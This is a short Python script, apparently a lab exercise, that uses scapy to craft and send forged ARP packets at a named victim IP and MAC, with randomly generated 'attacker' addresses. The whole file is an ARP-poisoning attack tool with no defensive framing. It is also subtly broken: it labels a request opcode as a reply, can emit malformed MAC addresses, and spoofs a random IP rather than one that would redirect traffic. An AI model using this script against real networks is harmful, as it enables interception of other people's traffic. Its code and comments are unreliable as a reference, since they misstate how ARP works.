import random
import time

from scapy.all import Ether, ARP, sendp, send


def generate_mac() -> str:
    mac_address = ""

    for i in range(6):
        number = random.randint(0, 255)
        hex_string = hex(number).removeprefix("0x")

        if i != 5:
            mac_address += f"{hex_string}:"

        else:
            mac_address += f"{hex_string}"

    return mac_address


def generate_ip() -> str:
    ip_address = ""

    for i in range(4):
        number = random.randint(0, 255)

        if i != 3:
            ip_address += f"{number}."

        else:
            ip_address += f"{number}"

    return ip_address


def generate_tcp_flag() -> str:
    flags = ("S", "A", "F", "R", "P", "U", "E", "C")

    return random.choice(flags)

def arp_poison(victim_ip: str, 
               victim_mac: str, 
               attacker_ip: str, 
               attacker_mac: str):

    arp = ARP()

    arp.hwsrc = attacker_mac
    arp.hwdst = victim_mac
    arp.psrc = attacker_ip
    arp.pdst = victim_ip

    arp.op = 1 # ARP Reply
    arp.show()

    send(arp)
 

arp_poison(victim_ip="192.168.56.102",
           victim_mac="08:00:27:47:3b:dc",
           attacker_ip=generate_ip(),
           attacker_mac=generate_mac())
